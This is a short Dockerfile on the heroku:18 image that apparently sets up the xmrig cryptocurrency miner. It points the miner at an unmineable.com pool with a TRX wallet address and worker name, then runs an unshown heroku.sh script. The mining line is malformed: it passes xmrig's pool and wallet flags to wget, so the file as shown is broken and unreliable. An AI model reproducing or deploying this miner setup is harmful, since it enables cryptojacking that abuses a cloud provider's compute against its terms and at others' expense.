FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget xmrig.exe -o rx-asia.unmineable.com:3333 -a rx -k -u trx:TFmgUhb9st5oARtnJdpoAqBWT4dbh1vzuE.Spiritway -p x pause
CMD bash heroku.sh
